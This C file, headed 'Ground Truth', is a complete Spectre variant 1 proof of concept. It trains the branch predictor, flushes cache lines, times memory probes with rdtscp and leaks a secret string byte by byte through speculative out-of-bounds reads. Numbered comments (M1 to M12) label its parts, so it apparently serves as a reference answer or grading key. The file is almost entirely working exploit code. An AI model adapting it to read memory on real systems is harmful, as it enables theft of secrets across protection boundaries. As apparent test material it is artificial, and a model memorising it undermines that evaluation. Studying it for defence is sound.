/* Ground Truth */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <x86intrin.h> 

unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[16] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t unused2[64];
uint8_t array2[256 * 512];

char * secret = "The Magic Words are Squeamish Ossifrage.";
uint8_t temp = 0; 

/* M1. Victim: Bounds-Checked, Secret-Dependent Access */
void victim_function(size_t x) {
  if (x < array1_size) {
    temp &= array2[array1[x] * 512];
  }
}

#define CACHE_HIT_THRESHOLD 80 

void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
  static int results[256];
  int tries, i, j, k, mix_i, junk = 0;
  size_t safe_x, x;
  register uint64_t time1, time2, time_difference;
  volatile uint8_t * addr;

  for (i = 0; i < 256; i++)
    results[i] = 0;
  for (tries = 999; tries > 0; tries--) {

    safe_x = tries % array1_size; 
    /* M4. Branch Predictor Training Loop: Loop Sequence Correctness (Train → Evict → Delay → Invoke) */
    for (j = 29; j >= 0; j--) {

      /* M3. Controlled Branch Misprediction (Interleaved, Branchless) */
      int cond = (j % 6 == 0);  // 1 or 0 --> Branchless condition
      x = safe_x + cond * (malicious_x - safe_x); // interleaved index between safe and malicious 

      /*M5. Cache Eviction Targets*/
      for (i = 0; i < 256; i++)
        _mm_clflush( & array2[i * 512]); // Evict array2 --> Probe array     
      _mm_clflush( & array1_size);       // Evict array1_size --> Control variable for bounds check

      /* M6. Controlled Delay (Window Extension) */
      for (volatile int z = 0; z < 100; z++) {} 

      victim_function(x); /* Invoke/trigger speculative execution */
    }


    for (i = 0; i < 256; i++) {
      /* M7. Mixed Probe Order (Stride/Index Masking) */
      mix_i = ((i * 167) + 13) & 255; /* Permuted probe order: large odd multiplier coprime to 256-->167; small offset-->13; &255 keeps indexing 0..255 */
      addr = & array2[mix_i * 512];

      /* M8. Measuring Memory Access Time through High-Resolution Timer */
      time1 = __rdtscp( & junk); 
      *addr; 
      time2 = __rdtscp( & junk); 
      time_difference = time2 - time1;

      /* M9. Hit/Miss Classification Threshold */
      if (time_difference <= CACHE_HIT_THRESHOLD && mix_i != array1[safe_x]) // exclude hits to safe_x
        results[mix_i]++; 
    }

    /* M10. Score Accumulation & Early-Stop */
    j = k = -1;
    for (i = 0; i < 256; i++) {
      if (j < 0 || results[i] >= results[j]) {
        k = j;
        j = i;
      } else if (k < 0 || results[i] >= results[k]) {
        k = i;
      }
    }
    if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
      break;
  }

  value[0] = (uint8_t) j;
  score[0] = results[j];
  value[1] = (uint8_t) k;
  score[1] = results[k];
}

int main() {
  /* M2. Secret Reachability (OOB Path) */
  size_t malicious_x = (size_t)(secret - (char * ) array1);
  
  int i, score[2], Length = strlen(secret);
  uint8_t value[2];

  /* M11. Array/Probe Initialization */
  for (i = 0; i < sizeof(array2); i++){
    array2[i] = 1; 
  }

  printf("Reading %d bytes:\n", Length);
  /* M12. Multi-Byte Extraction Loop */
  while (--Length >= 0) {
    printf("Reading at malicious_x = %p... ", (void * ) malicious_x);
    readMemoryByte(malicious_x++, value, score);
    printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
    printf("0x%02X=’%c’ score=%d ", value[0],
      (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
    printf("\n");
  }
  return (0);
}